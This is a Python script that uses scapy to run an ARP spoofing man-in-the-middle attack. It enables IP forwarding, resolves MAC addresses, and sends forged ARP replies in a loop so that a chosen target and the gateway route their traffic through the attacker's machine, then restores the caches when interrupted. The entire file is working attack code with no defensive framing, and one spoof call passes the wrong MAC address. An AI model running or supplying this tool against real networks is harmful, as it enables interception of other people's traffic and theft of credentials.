#!/usr/bin/env python

import scapy.all as scapy
import time, sys, argparse, subprocess

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Enter the target IP")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Enter the gateway IP")
    args = parser.parse_args()
    if not args.target:
        parser.error("[-] Specify target IP, use --help for more info")
    elif not args.gateway:
        parser.error("[-] Specify gateway IP, use --help for more info")
    return args

def enable_forwarding():
    print("[+] Checking packet forwarding...")
    output = subprocess.check_output(["/bin/cat", "/proc/sys/net/ipv4/ip_forward"])
    if output == "1\n":
        print("[+] Done.")
    elif output == "0\n":
        print("[+] Enabling packet forwarding...")
        f = open('/proc/sys/net/ipv4/ip_forward', 'w')
        f.write("1")
        f.close()
        #subprocess.call(["/bin/echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"], shell=False, stdout=subprocess.PIPE)
        print("[+] Done.")

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=10, verbose=False)[0]
    
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dst_ip, src_ip, target_mac, gateway_mac):
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=target_mac, psrc=src_ip, hwsrc=gateway_mac)
    scapy.send(packet, count=2, verbose=False)

args = get_arguments()

target_ip = args.target
gateway_ip = args.gateway

target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)

try:
    enable_forwarding()
    sent_packets_count = 0
    while True: 
        spoof(target_ip, gateway_ip, target_mac)
        spoof(gateway_ip, target_ip, target_mac)
        sent_packets_count += 2
        print("\r[+] Packet sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL+C, Stopping MiTM...")
    time.sleep(1)
    restore(target_ip, gateway_ip, target_mac, gateway_mac)
    restore(gateway_ip, target_ip, gateway_mac, target_mac)
    print("[+] Stopped, Quitting...")
